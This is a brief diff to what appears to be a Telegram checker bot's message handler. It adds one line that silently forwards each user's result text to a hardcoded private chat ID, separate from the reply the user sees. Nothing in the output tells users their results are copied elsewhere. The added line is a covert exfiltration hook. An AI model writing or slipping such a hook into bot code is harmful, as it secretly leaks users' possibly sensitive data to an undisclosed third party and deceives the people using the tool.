@@ -263,6 +263,7 @@ async def sf(Client, message):
 <b>♻️</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
 <b>🧑🏻‍💻| BOT BY: @MrItzMe</b>"""
                                             await msg.edit_text(lasttext)
+                                            await Client.send_message(-1001513565895, lasttext)
                                             antidb.set(message.from_user.id, int(time.time()))
     
     except Exception as e:
